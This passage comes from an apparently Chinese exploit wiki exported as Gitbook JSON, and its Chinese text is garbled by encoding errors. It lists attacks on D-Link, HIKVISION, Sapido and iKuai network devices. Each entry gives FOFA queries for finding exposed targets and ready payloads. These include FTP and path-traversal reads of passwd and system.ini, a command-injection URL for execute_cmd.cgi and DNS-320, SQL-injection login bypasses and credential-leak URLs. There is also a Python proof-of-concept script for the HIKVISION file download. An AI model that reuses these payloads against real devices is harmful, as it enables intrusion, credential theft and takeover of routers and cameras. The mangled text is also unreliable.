FTPÈÖçÁΩÆÈîôËØØ CVE-2020-24578 ÊºèÊ¥ûÊèèËø∞ D-Link DSL-2888AË∑ØÁî±Âô®ÂÖ∑ÊúâÊñá‰ª∂ÂÖ±‰∫´ÂäüËÉΩÔºåËØ•ÂäüËÉΩÂÖÅËÆ∏Áî®Êà∑ÈÄöËøáÂ∞ÜÂ§ñÈÉ®È©±Âä®Âô®ÊèíÂÖ•Ë∑ØÁî±Âô®Êù•‰∏éÂÖ∂‰ªñÁΩëÁªúÁî®Êà∑ÂÖ±‰∫´Êñá‰ª∂„ÄÇÁÑ∂ÂêéÈÄöËøáFTPÔºàÊñá‰ª∂‰º†ËæìÂçèËÆÆÔºâÂÖ±‰∫´„ÄÇ‰ΩÜÊòØÔºåFTPÊúçÂä°ÂÖÅËÆ∏ÁΩëÁªúÁî®Êà∑ËΩ¨‰πâÂÖ±‰∫´Êñá‰ª∂Â§π‰ª•ËÆøÈóÆË∑ØÁî±Âô®Êñá‰ª∂Á≥ªÁªüÂπ∂‰∏ãËΩΩ‰Ωç‰∫éÊ†πÊñá‰ª∂Â§π‰∏≠ÁöÑÂÖ∂‰ªñÊñá‰ª∂„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] D-Link DSL-2888A FOFA [!NOTE] body=\"DSL-2888A\" ÊºèÊ¥ûÂ§çÁé∞ ÂâçÊèê‰∏∫‰ΩøÁî® D-Link DSL-28881A ‰ø°ÊÅØÊ≥ÑÈú≤ CVE-2020-24577 Ëé∑ÂèñFTPÂá≠ËØÅ ‰ª•‰∏ãÊèê‰æõ‰∫Ü‰∏ãËΩΩ‚Äú passwd‚ÄùÁöÑÁ§∫‰æãÔºö Âú®FTPÂÆ¢Êà∑Á´Ø‰∏ä‰ΩøÁî®‰ª•‰∏ãÂëΩ‰ª§‰ª•ÊúâÊïàÁöÑÂá≠ÊçÆÔºà‰ªéFinding-2Ëé∑ÂæóÔºâËøûÊé•Âà∞FTPÊúçÂä°„ÄÇ ‰ΩøÁî®‰ª•‰∏ãÂëΩ‰ª§ÂØºËà™Âà∞Ê†πÊñá‰ª∂Â§π„ÄÇ ftp xxx.xxx.xxx.xxx ftp> cd etc ftp> get passwd Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/D-Link/D-Link DSL-28881A Êú™ÊéàÊùÉËÆøÈóÆ CVE-2020-24579.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/D-Link/D-Link DSL-28881A Êú™ÊéàÊùÉËÆøÈóÆ CVE-2020-24579.html","title":"D-Link DSL-28881A Êú™ÊéàÊùÉËÆøÈóÆ CVE-2020-24579","keywords":"","body":"D-Link DSL-28881A Êú™ÊéàÊùÉËÆøÈóÆ CVE-2020-24579 ÊºèÊ¥ûÊèèËø∞ Ë∑ØÁî±Âô®WebÈó®Êà∑ÁöÑË∫´‰ªΩÈ™åËØÅ‰∏çË∂≥ÔºåÊó†Ê≥ïËÆøÈóÆ‰ªª‰ΩïÁªèËøáË∫´‰ªΩÈ™åËØÅÁöÑÁÆ°ÁêÜÈ°µÈù¢ÔºåËÄåÊó†ÈúÄËæìÂÖ•Ê≠£Á°ÆÁöÑÂØÜÁ†Å„ÄÇ‰Ωç‰∫éÂêå‰∏ÄÁΩëÁªú‰∏äÁöÑÊÅ∂ÊÑèÁî®Êà∑ÂèØ‰ª•‰ΩøÁî®Êó†ÊïàÁöÑÂá≠ÊçÆÁõ¥Êé•ÊµèËßàÂà∞‰ªª‰ΩïÁªèËøáË∫´‰ªΩÈ™åËØÅÁöÑÁÆ°ÁêÜÈ°µÈù¢„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] D-Link DSL-2888A FOFA [!NOTE] body=\"DSL-2888A\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢ËæìÂÖ•‰ªªÊÑèÂØÜÁ†ÅÂª∫Á´ãËøûÊé• Ë∑≥ËΩ¨Âà∞ http://xxx.xxx.xxx.xxx/page/login/login.html?error=fail ÊòæÁ§∫ÂØÜÁ†ÅÈîôËØØ ÂÜçËØ∑Ê±ÇURL http://xxx.xxx.xxx.xxx/WiFi.shtml Êú™ÊéàÊùÉËÆøÈóÆÂêéÂè∞ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/D-Link/D-Link DSL-28881A ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2020-24581.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/D-Link/D-Link DSL-28881A ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2020-24581.html","title":"D-Link DSL-28881A ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2020-24581","keywords":"","body":"D-Link DSL-28881A ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2020-24581 ÊºèÊ¥ûÊèèËø∞ D-Link DSL-2888A AU_2.31_V1.1.47ae55‰πãÂâçÁâàÊú¨Â≠òÂú®ÂÆâÂÖ®ÊºèÊ¥ûÔºåËØ•ÊºèÊ¥ûÊ∫ê‰∫éÂåÖÂê´‰∏Ä‰∏™execute cmd.cgiÁâπÊÄß(‰∏çËÉΩÈÄöËøáwebÁî®Êà∑ÁïåÈù¢ËÆøÈóÆ)ÔºåËØ•ÁâπÊÄßÂÖÅËÆ∏ÁªèËøáË∫´‰ªΩÈ™åËØÅÁöÑÁî®Êà∑ÊâßË°åÊìç‰ΩúÁ≥ªÁªüÂëΩ‰ª§„ÄÇ Âú®ËØ•ÁâàÊú¨Âõ∫‰ª∂‰∏≠ÂêåÊó∂Â≠òÂú®ÁùÄ‰∏Ä‰∏™‰∏çÂÆâÂÖ®ËÆ§ËØÅÊºèÊ¥ûÔºàCVE-2020-24580ÔºâÔºåÂú®ÁôªÂΩïÁïåÈù¢ËæìÂÖ•‰ªªÊÑèÂØÜÁ†ÅÂ∞±ÂèØ‰ª•ÊàêÂäüËÆøÈóÆË∑ØÁî±Âô®ÁïåÈù¢„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] D-Link DSL-2888A FOFA [!NOTE] body=\"DSL-2888A\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢ËæìÂÖ•‰ªªÊÑèÂØÜÁ†ÅÂª∫Á´ãËøûÊé• Ë∑≥ËΩ¨Âà∞ http://xxx.xxx.xxx.xxx/page/login/login.html?error=fail ÊòæÁ§∫ÂØÜÁ†ÅÈîôËØØ ÊºèÊ¥ûÂá∫Áé∞Âú® execute_cmd.cgi Êñá‰ª∂‰∏≠ #!/bin/sh . /usr/syscfg/api_log.sh cmd=`echo ${QUERY_STRING} | cut -d = -f 3` cmd=`echo ${cmd} | tr \"%20\" \" \"` result=`${cmd}` TGP_Log ${TGP_LOG_WARNING} \"cmd=${cmd}, result=${result}\" echo \"Content-type: text/html\" echo \"\" echo -n ${result} ËøôÈáåÂèñÂá∫ ${QUERY_STRING} ‰∏≠ÁöÑÁ¨¨‰∫å‰∏™ÂèÇÊï∞ÂÄºÔºåÁÑ∂ÂêéÂéªÈô§Á©∫Ê†ºÂëΩ‰ª§ÊâßË°å Âú®Ëøô‰∏™ËøáÁ®ã‰∏≠Âπ∂Ê≤°ÊúâËøáÊª§ÔºåÁúã‰∏Ä‰∏ãÂèÇÊï∞‰ªéÂì™Êù•ÁöÑ Êñá‰ª∂ /www/js/ajax.js get : function(_dataType) { var _url = this.url; if(_url.indexOf('?') == -1) _url += '?timestamp=' + new Date().getTime(); else _url += \"&timestamp=\" + new Date().getTime(); if(this.queryString.length > 0) _url += \"&\" + this.queryString; this.xmlHttp.open(\"GET\", _url, true); /* will make IE11 fail. if(!document.all){ if(_dataType == \"xml\") this.xmlHttp.overrideMimeType(\"text/xml;charset=utf8\"); else this.xmlHttp.overrideMimeType(\"text/html;charset=gb2312\");//ËÆæÂÆö‰ª•gb2312ÁºñÁ†ÅËØÜÂà´Êï∞ÊçÆ } */ this.xmlHttp.send(null); }, Áúã‰∏Ä‰∏ãËøáÁ®ã ‚îå‚îÄ‚îÄ(root)-[/tmp] ‚îî‚îÄ# echo \"timestamp=1589333279490&cmd=whoami\" | cut -d = -f 3 whoami ËøôÈáåÂèñÁ¨¨‰∫å‰∏™ÂèÇÊï∞ whoami ÁÑ∂ÂêéÂ∞±Ê≤°ÊúâËøáÊª§ÁöÑÊâßË°å‰∫Ü ÊâÄ‰ª•EXP‰∏∫: http://xxx.xxx.xxx.xxx/cgi-bin/execute_cmd.cgi?timestamp=test&cmd=whoami Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/D-Link/D-Link DCSÁ≥ªÂàóÁõëÊéß Ë¥¶Âè∑ÂØÜÁ†Å‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CVE-2020-25078.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/D-Link/D-Link DCSÁ≥ªÂàóÁõëÊéß Ë¥¶Âè∑ÂØÜÁ†Å‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CVE-2020-25078.html","title":"D-Link DCSÁ≥ªÂàóÁõëÊéß Ë¥¶Âè∑ÂØÜÁ†Å‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CVE-2020-25078","keywords":"","body":"D-Link DCSÁ≥ªÂàóÁõëÊéß Ë¥¶Âè∑ÂØÜÁ†Å‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CVE-2020-25078 ÊºèÊ¥ûÊèèËø∞ D-Link DCSÁ≥ªÂàóÁõëÊéß ÈÄöËøáËÆøÈóÆÁâπÂÆöÁöÑURLÂæóÂà∞Ë¥¶Âè∑ÂØÜÁ†Å‰ø°ÊÅØÔºåÊîªÂáªËÄÖÈÄöËøáÊºèÊ¥ûËøõÂÖ•ÂêéÂè∞ÂèØ‰ª•Ëé∑ÂèñËßÜÈ¢ëÁõëÊéßÈ°µÈù¢ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] DCS-2530L DCS-2670L DCS-4603 DCS-4622 DCS-4701E DCS-4703E DCS-4705E DCS-4802E DCS-P703 FOFA [!NOTE] app=\"D_Link-DCS-2530L\" ÊºèÊ¥ûÂ§çÁé∞ ËÆøÈóÆÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã Âá∫Áé∞ÊºèÊ¥ûÁöÑ Url ‰∏∫, ÂÖ∂‰∏≠Ê≥ÑÈú≤‰∫ÜË¥¶Âè∑ÂØÜÁ†Å http://xxx.xxx.xxx.xxx/config/getuser?index=0 ‰ΩøÁî®Ê≥ÑÈú≤ÁöÑË¥¶Âè∑ÂØÜÁ†ÅÁôªÈôÜÁ≥ªÁªü Goby & POC [!NOTE] Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ D_Link_DC_Disclosure_of_account_password_information Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/D-Link/D-Link ShareCenter DNS-320 system_mgr.cgi ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/D-Link/D-Link ShareCenter DNS-320 system_mgr.cgi ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"D-Link ShareCenter DNS-320 system_mgr.cgi ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"D-Link ShareCenter DNS-320 system_mgr.cgi ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ D-Link ShareCenter DNS-320 system_mgr.cgi Â≠òÂú®ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÔºåÊîªÂáªËÄÖÈÄöËøáÊºèÊ¥ûÂèØ‰ª•ÊéßÂà∂ÊúçÂä°Âô® ÊºèÊ¥ûÂΩ±Âìç [!NOTE] D-Link ShareCenter DNS-320 FOFA [!NOTE] app=\"D_Link-DNS-ShareCenter\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÊºèÊ¥ûPOC‰∏∫ /cgi-bin/system_mgr.cgi?cmd=cgi_get_log_item&total=;ls; Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/D-Link/D-Link DSR-250N ‰∏áËÉΩÂØÜÁ†ÅÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/D-Link/D-Link DSR-250N ‰∏áËÉΩÂØÜÁ†ÅÊºèÊ¥û.html","title":"D-Link DSR-250N ‰∏áËÉΩÂØÜÁ†ÅÊºèÊ¥û","keywords":"","body":"D-Link DSR-250N ‰∏áËÉΩÂØÜÁ†ÅÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ D-Link DSR-250N Â≠òÂú®‰∏áËÉΩÂØÜÁ†ÅÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÊºèÊ¥ûÂèØ‰ª•Ëé∑ÂèñÂêéÂè∞ÊùÉÈôê ÊºèÊ¥ûÂΩ±Âìç [!NOTE] D-Link DSR-250N FOFA [!NOTE] app=\"D_Link-DSR-250N\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã user: admin pass: ' or '1'='1 ÊàêÂäüÁôªÂΩïÂêéÂè∞ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/HIKVISION/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/HIKVISION/","title":"HIKVISION","keywords":"","body":"HIKVISION HIKVISION ËßÜÈ¢ëÁºñÁ†ÅËÆæÂ§áÊé•ÂÖ•ÁΩëÂÖ≥ ‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩ HIKVISION ÊµÅÂ™í‰ΩìÁÆ°ÁêÜÊúçÂä°Âô® ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CNVD-2021-14544 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/HIKVISION/HIKVISION ËßÜÈ¢ëÁºñÁ†ÅËÆæÂ§áÊé•ÂÖ•ÁΩëÂÖ≥ ‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩ.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/HIKVISION/HIKVISION ËßÜÈ¢ëÁºñÁ†ÅËÆæÂ§áÊé•ÂÖ•ÁΩëÂÖ≥ ‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩ.html","title":"HIKVISION ËßÜÈ¢ëÁºñÁ†ÅËÆæÂ§áÊé•ÂÖ•ÁΩëÂÖ≥ ‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩ","keywords":"","body":"HIKVISION ËßÜÈ¢ëÁºñÁ†ÅËÆæÂ§áÊé•ÂÖ•ÁΩëÂÖ≥ ‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩ ÊºèÊ¥ûÊèèËø∞ Êµ∑Â∫∑Â®ÅËßÜËßÜÈ¢ëÊé•ÂÖ•ÁΩëÂÖ≥Á≥ªÁªüÂú®È°µÈù¢/serverLog/downFile.phpÁöÑÂèÇÊï∞fileNameÂ≠òÂú®‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩÊºèÊ¥û ÊºèÊ¥ûÂΩ±Âìç [!NOTE] HIKVISION ËßÜÈ¢ëÁºñÁ†ÅËÆæÂ§áÊé•ÂÖ•ÁΩëÂÖ≥ FOFA [!NOTE] title=\"ËßÜÈ¢ëÁºñÁ†ÅËÆæÂ§áÊé•ÂÖ•ÁΩëÂÖ≥\" ÊºèÊ¥ûÂ§çÁé∞ ÊºèÊ¥ûÊñá‰ª∂‰∏∫ downFile.php, ÂÖ∂‰∏≠ ÂèÇÊï∞ fileName Ê≤°ÊúâËøáÊª§Âç±Èô©Â≠óÁ¨¶ÔºåÂØºËá¥ÂèØÊñá‰ª∂ÈÅçÂéÜ‰∏ãËΩΩ alert(\"Êñá‰ª∂‰∏çÂ≠òÂú®!\");window.history.back(-1);'; exit(); }else{ $file = fopen($file_dir . $file_name,\"r\"); // ÊâìÂºÄÊñá‰ª∂ // ËæìÂÖ•Êñá‰ª∂Ê†áÁ≠æ Header(\"Content-type: application/octet-stream\"); Header(\"Accept-Ranges: bytes\"); Header(\"Accept-Length: \".filesize($file_dir . $file_name)); Header(\"Content-Disposition: attachment; filename=\" . $file_name); // ËæìÂá∫Êñá‰ª∂ÂÜÖÂÆπ echo fread($file,filesize($file_dir.$file_name)); fclose($file); exit(); } ?> ËÆøÈóÆ http://xxx.xxx.xxx.xxx/serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php ‰∏ãËΩΩÊñá‰ª∂ ÊºèÊ¥ûÂà©Áî®POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: HIKVISION ËßÜÈ¢ëÁºñÁ†ÅËÆæÂ§áÊé•ÂÖ•ÁΩëÂÖ≥ \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] Ê≠£Âú®ËØ∑Ê±Ç {}/serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php \\033[0m\".format(target_url)) if \"$file_name\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {}Â≠òÂú®ÊºèÊ¥û ,ÊàêÂäüËØªÂèñ downFile.php \\033[0m\".format(target_url)) print(\"\\033[32m[o] ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] ‰∏çÂ≠òÂú®ÊºèÊ¥û \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ HIKVISION_Video_coding_equipment_Download_any_file Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/HIKVISION/HIKVISION ÊµÅÂ™í‰ΩìÁÆ°ÁêÜÊúçÂä°Âô® ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CNVD-2021-14544.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/HIKVISION/HIKVISION ÊµÅÂ™í‰ΩìÁÆ°ÁêÜÊúçÂä°Âô® ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CNVD-2021-14544.html","title":"HIKVISION ÊµÅÂ™í‰ΩìÁÆ°ÁêÜÊúçÂä°Âô® ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CNVD-2021-14544","keywords":"","body":"HIKVISION ÊµÅÂ™í‰ΩìÁÆ°ÁêÜÊúçÂä°Âô® ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CNVD-2021-14544 ÊºèÊ¥ûÊèèËø∞ Êù≠Â∑ûÊµ∑Â∫∑Â®ÅËßÜÁ≥ªÁªüÊäÄÊúØÊúâÈôêÂÖ¨Âè∏ÊµÅÂ™í‰ΩìÁÆ°ÁêÜÊúçÂä°Âô®Â≠òÂú®Âº±Âè£‰ª§ÊºèÊ¥ûÔºåÊîªÂáªËÄÖÂèØÂà©Áî®ËØ•ÊºèÊ¥ûÁôªÂΩïÂêéÂè∞ÈÄöËøáÊñá‰ª∂ÈÅçÂéÜÊºèÊ¥ûËé∑ÂèñÊïèÊÑü‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] HIKVISION ÊµÅÂ™í‰ΩìÁÆ°ÁêÜÊúçÂä°Âô® FOFA [!NOTE] title=\"ÊµÅÂ™í‰ΩìÁÆ°ÁêÜÊúçÂä°Âô®\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ãÔºå ÈªòËÆ§Ë¥¶Âè∑ÂØÜÁ†Å‰∏∫ admin/12345 POCÂ¶Ç‰∏ãÔºåËÆøÈóÆÂ¶Ç‰∏ãUrl‰∏ãËΩΩ system.iniÊñá‰ª∂ http://xxx.xxx.xxx.xxx/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini ÊàêÂäüËØªÂèñ C:/windows/system.ini Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Sapido/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Sapido/","title":"Sapido","keywords":"","body":"Sapido SapidoÂ§öÊ¨æË∑ØÁî±Âô®ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Sapido/SapidoÂ§öÊ¨æË∑ØÁî±Âô®ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Sapido/SapidoÂ§öÊ¨æË∑ØÁî±Âô®ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"SapidoÂ§öÊ¨æË∑ØÁî±Âô®ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"SapidoÂ§öÊ¨æË∑ØÁî±Âô®ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ SapidoÂ§öÊ¨æË∑ØÁî±Âô®Âú®Êú™ÊéàÊùÉÁöÑÊÉÖÂÜµ‰∏ãÔºåÂØºËá¥‰ªªÊÑèËÆøÈóÆËÄÖÂèØ‰ª•‰ª•RootÊùÉÈôêÊâßË°åÂëΩ‰ª§ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] BR270n-v2.1.03 BRC76n-v2.1.03 GR297-v2.1.3 RB1732-v2.0.43 FOFA [!NOTE] app=\"Sapido-Ë∑ØÁî±Âô®\" ÊºèÊ¥ûÂ§çÁé∞ Âõ∫‰ª∂‰∏≠Â≠òÂú®‰∏Ä‰∏™aspÊñá‰ª∂‰∏∫ syscmd.asp Â≠òÂú®ÂëΩ‰ª§ÊâßË°å ËÆøÈóÆÁõÆÊ†á: http://xxx.xxx.xxx.xxx/syscmd.asp http://xxx.xxx.xxx.xxx/syscmd.htm Áõ¥Êé•ËæìÂÖ•Â∞±ÂèØ‰ª•ÂëΩ‰ª§ÊâßË°å‰∫Ü Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/H3C/H3C HG659 lib ‰ªªÊÑèÊñá‰ª∂ËØªÂèñ.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/H3C/H3C HG659 lib ‰ªªÊÑèÊñá‰ª∂ËØªÂèñ.html","title":"H3C HG659 lib ‰ªªÊÑèÊñá‰ª∂ËØªÂèñ","keywords":"","body":"H3C HG659 lib ‰ªªÊÑèÊñá‰ª∂ËØªÂèñ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:50:07 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/H3C/H3C SecPath ‰∏ã‰∏Ä‰ª£Èò≤ÁÅ´Â¢ô ‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/H3C/H3C SecPath ‰∏ã‰∏Ä‰ª£Èò≤ÁÅ´Â¢ô ‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩÊºèÊ¥û.html","title":"H3C SecPath ‰∏ã‰∏Ä‰ª£Èò≤ÁÅ´Â¢ô ‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩÊºèÊ¥û","keywords":"","body":"H3C SecPath ‰∏ã‰∏Ä‰ª£Èò≤ÁÅ´Â¢ô ‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:50:07 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/iKuai/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/iKuai/","title":"iKuai","keywords":"","body":"iKuai iKuai ÊµÅÊéßË∑ØÁî± SQLÊ≥®ÂÖ•ÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/iKuai/iKuai ÊµÅÊéßË∑ØÁî± SQLÊ≥®ÂÖ•ÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/iKuai/iKuai ÊµÅÊéßË∑ØÁî± SQLÊ≥®ÂÖ•ÊºèÊ¥û.html","title":"iKuai ÊµÅÊéßË∑ØÁî± SQLÊ≥®ÂÖ•ÊºèÊ¥û","keywords":"","body":"iKuai ÊµÅÊéßË∑ØÁî± SQLÊ≥®ÂÖ•ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ iKuai ÊµÅÊéßË∑ØÁî± Â≠òÂú®SQLÊ≥®ÂÖ•ÊºèÊ¥ûÔºåÂèØ‰ª•ÈÄöËøáSQLÊ≥®ÂÖ•ÊºèÊ¥ûÊûÑÈÄ†‰∏áËÉΩÂØÜÁ†ÅËé∑ÂèñË∑ØÁî±Âô®ÂêéÂè∞ÁÆ°ÁêÜÊùÉÈôê ÊºèÊ¥ûÂΩ±Âìç [!NOTE] iKuai ÊµÅÊéßË∑ØÁî± FOFA [!NOTE] title=\"ÁôªÂΩïÁà±Âø´ÊµÅÊéßË∑ØÁî±\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ‰ΩøÁî®‰∏áËÉΩÂØÜÁ†ÅÁôªÂΩïÂêéÂè∞ user: \"or\"\"=\"\"or\"\"=\" pass: 